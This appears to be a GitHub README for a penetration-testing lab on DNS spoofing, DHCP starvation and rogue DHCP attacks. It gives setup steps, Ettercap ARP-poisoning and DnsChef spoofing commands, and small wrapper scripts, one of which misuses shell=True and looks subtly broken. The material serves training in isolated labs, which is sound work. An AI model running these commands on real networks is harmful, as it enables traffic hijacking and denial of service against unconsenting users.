# 🧪 DNS & DHCP Attack Vectors Lab

Welcome to the **DNS & DHCP Attack Vectors Lab**, a hands-on, real-world simulation platform for cybersecurity learners, penetration testers, and network analysts. This lab focuses on DNS spoofing, DHCP starvation, and rogue DHCP attack vectors within a controlled environment.

---

## 🔍 Project Overview

### What Are DNS & DHCP Attacks?
DNS (Domain Name System) and DHCP (Dynamic Host Configuration Protocol) are foundational to IP-based communication. When exploited, they enable attackers to:

- Redirect users to malicious sites (DNS spoofing)
- Deny IP allocation to clients (DHCP starvation)
- Hijack traffic via rogue DHCP servers

### Why This Lab Is Valuable
This project equips cybersecurity professionals to:

- Understand real-world attack paths
- Simulate adversarial behavior safely
- Analyze and interpret network traffic
- Learn defense and mitigation techniques

### ⚖️ Legal & Ethical Disclaimer
> This lab is **strictly for educational and authorized use**. All tests must be performed in isolated lab environments that **you own** or are **explicitly permitted** to test. Unauthorized use is **illegal** and **unethical**. The maintainers assume **no liability**.

---

## 🧰 Prerequisites

### 🖥 Operating System
- Kali Linux (Recommended)
- Ubuntu (With required tools installed)

### 🛠 Required Tools
- **DnsChef** – DNS Spoofing
- **DHCPig** – DHCP Starvation
- **Ettercap** – Rogue DHCP
- **Wireshark** – Packet Analysis
- **net-tools**, **tcpdump**, **python3-pip**

### 💻 Virtualization
- VirtualBox / VMware

### ⚙️ System Requirements
- 4 GB RAM (8 GB preferred)
- 2+ CPU Cores
- 20 GB Disk Space

### 🌐 Network Configuration
- Use **Host-Only Adapter** or **Internal Network**
- Ensure **complete isolation** from your main network

---

## 🔧 Lab Setup Guide

### Step 1: VirtualBox Installation
```bash
sudo apt update && sudo apt install virtualbox
```

### Step 2: Kali Linux VM
- Allocate: 2 vCPUs, 4–8 GB RAM, 20+ GB Disk
- Attach ISO and install
- Configure Host-Only networking

### Step 3: Tool Installation
```bash
sudo apt install ettercap-graphical dnschef wireshark net-tools python3-pip
sudo pip3 install dhcpig
```

### Step 4: Static IP Configuration (Optional)
```bash
sudo ifconfig eth0 192.168.56.101 netmask 255.255.255.0 up
```

---

## 📁 Folder Structure

```
DNS_DHCP_Attack_Lab/
├── README.md
├── LICENSE
├── scripts/
│   ├── dns_spoof.py
│   ├── rogue_dhcp.sh
│   └── dhcp_starvation.py
├── screenshots/
│   └── sample_output.png
├── lab_exercises/
│   ├── dns_spoofing.md
│   ├── dhcp_starvation.md
│   ├── rogue_dhcp.md
│   └── sniffing_with_wireshark.md
├── docs/
│   └── interview_questions.md
```

### 📂 Folder Descriptions
- `scripts/`: Automated attack scripts (Bash/Python)
- `screenshots/`: Visual output and UI snapshots
- `lab_exercises/`: Step-by-step markdown-based guides
- `docs/`: Extended resources (e.g., interview questions)

---

## 🧪 Lab Exercises

### 1️⃣ DNS Spoofing with DnsChef
```bash
sudo dnschef --fakeip 192.168.56.105 --interface eth0
```
**Expected Result**: All DNS queries receive spoofed IP response.

### 2️⃣ DHCP Starvation with DHCPig
```bash
sudo python3 $(which dhcpig) -i eth0
```
**Expected Result**: DHCP pool is exhausted, denying legitimate leases.

### 3️⃣ Rogue DHCP with Ettercap
```bash
sudo ettercap -T -q -i eth0 -P dhcp -M arp:remote
```
**Expected Result**: Victim receives attacker's IP/gateway configuration.

### 4️⃣ Sniffing with Wireshark
- Open Wireshark
- Filter with:
```wireshark
bootp or dns
```
**Expected Result**: View DNS resolutions and DHCP lease activity.

---

## 🧠 [Interview Questions & Answers](./docs/interview_questions.md)
A curated list of 10+ DNS & DHCP-related technical questions to prepare for real-world interviews and certifications.

---

## ⚠️ Troubleshooting & Tips

### 🔍 Common Issues
| Problem | Solution |
|--------|----------|
| Interface not found | Run `ifconfig` or `ip a` to check actual interface |
| Permission denied (Wireshark) | Add user to `wireshark` group and re-login |
| DHCP conflict | Ensure only one DHCP server in the lab |
| Internet not working in VM | Use NAT + Host-only combination |

```bash
sudo usermod -aG wireshark $USER
```

---

## 📜 Scripts Quick View

### `scripts/dns_spoof.py`
```python
#!/usr/bin/env python3
import subprocess
print("[+] Starting DNS Spoofing with DnsChef...")
subprocess.run(["sudo", "dnschef", "--fakeip", "192.168.56.105", "--interface", "eth0"])
```

### `scripts/rogue_dhcp.sh`
```bash
#!/bin/bash
echo "[+] Launching Rogue DHCP Server via Ettercap..."
sudo ettercap -T -q -i eth0 -P dhcp -M arp:remote
```

### `scripts/dhcp_starvation.py`
```python
#!/usr/bin/env python3
import subprocess
print("[+] Launching DHCP Starvation using DHCPig...")
subprocess.run(["sudo", "python3", "$(which dhcpig)", "-i", "eth0"], shell=True)
```

---

## 📚 Lab Exercise Summaries

### `lab_exercises/dns_spoofing.md`
- **Objective**: Redirect DNS queries
- **Tool**: DnsChef
- **Outcome**: Victim resolves attacker-controlled IPs

### `lab_exercises/dhcp_starvation.md`
- **Objective**: Deny IPs to clients
- **Tool**: DHCPig
- **Outcome**: DHCP server leases exhausted

### `lab_exercises/rogue_dhcp.md`
- **Objective**: Deliver malicious config
- **Tool**: Ettercap
- **Outcome**: Attacker controls IP, DNS, and Gateway

### `lab_exercises/sniffing_with_wireshark.md`
- **Objective**: Inspect DNS/DHCP traffic
- **Tool**: Wireshark
- **Outcome**: Analyze traffic patterns and anomalies

---

## 📄 License
MIT License — see [LICENSE](./LICENSE)

---

## 🤝 Contributing
Pull requests and forks welcome. Let’s make network security education accessible and actionable.

**Maintained by**: [SudoXploit](https://github.com/SudoXploit)
